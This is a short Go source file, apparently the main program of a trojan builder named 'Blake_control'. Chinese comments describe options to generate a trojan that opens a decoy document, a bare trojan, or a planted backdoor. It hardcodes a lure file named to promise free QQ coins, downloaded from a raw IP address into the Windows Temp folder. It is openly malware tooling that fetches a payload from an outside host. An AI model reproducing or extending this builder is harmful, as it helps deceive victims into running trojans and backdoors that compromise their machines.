package main

import "Blake_control/generate"

const (
	//下载的文件存放处和打开文件路径
	path = "C:\\Windows\\Temp\\刷Q币.doc"
	//path = "https://wx.qq.com/"
	//下载文件的url
	url = "http://182.92.99.52:8887/1.doc"
	//后门木马url
	url1 = ""
	//后门木马文件存放地址
	//path1 = "C:\\Windows\\Temp\\test.exe"
)

//main方法
func main() {

	//生成木马弹出文件
	generate.Tnuma(url, path)

	//只生成木马
	//generate.Onlymuma()
	//只植入后门
	//generate.Onlybackdoor(url1, path1)
	//生成木马弹出文件植入后门
	//generate.MTZmuma(url, path, url1, path1)
}
